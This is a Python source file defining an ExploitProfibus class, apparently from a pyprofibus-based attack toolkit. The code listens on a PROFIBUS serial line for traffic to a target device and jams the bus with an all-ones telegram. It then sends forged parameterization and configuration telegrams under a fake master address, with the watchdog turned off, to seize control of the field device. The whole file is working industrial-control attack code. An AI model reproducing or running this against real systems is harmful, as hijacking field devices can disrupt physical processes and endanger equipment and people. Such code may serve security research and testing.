import time
from pyprofibus.attacker.exploit import Exploit
from pyprofibus.dp.dp import DpTelegram_SetPrm_Req
from pyprofibus.slave.Data_ExchState import Data_ExchState
from pyprofibus.slave.SlaveException import SlaveException


class ExploitProfibus(Exploit):

    def listenForMasterToTargetCommunication(self):
        while True:
            read_bytes: bytes = self.serial.read(5)
            if read_bytes[0] == 0x68 and read_bytes[4] == self.target_address:
                break
            time.sleep(0.1)
        
    
    def disturbCommunication(self):
        self.slave.phy.sendData(self.telegram_all_one, None)
        time.sleep(0.05)
    
    def communicationBroke(self) -> bool:
        read_bytes: bytes = self.serial.read(5)
        if read_bytes[0] == 0x68 and read_bytes[4] == 127:
            return True
        else:
            return False
    
    def sendParameterization(self):
        telegram = self.slave.slaveDesc.setPrmTelegram
        telegram.sa = self.fake_master_address
        telegram.stationStatus = DpTelegram_SetPrm_Req.STA_LOCK # WD off
        raw_telegram = telegram.toFdlTelegram().getRawData()
        self.slave.phy.sendData(raw_telegram, None)
    
    def sendConfiguration(self):
        telegram = self.slave.slaveDesc.chkCfgTelegram
        telegram.sa = self.fake_master_address
        raw_telegram = telegram.toFdlTelegram().getRawData()
        self.slave.phy.sendData(raw_telegram, None)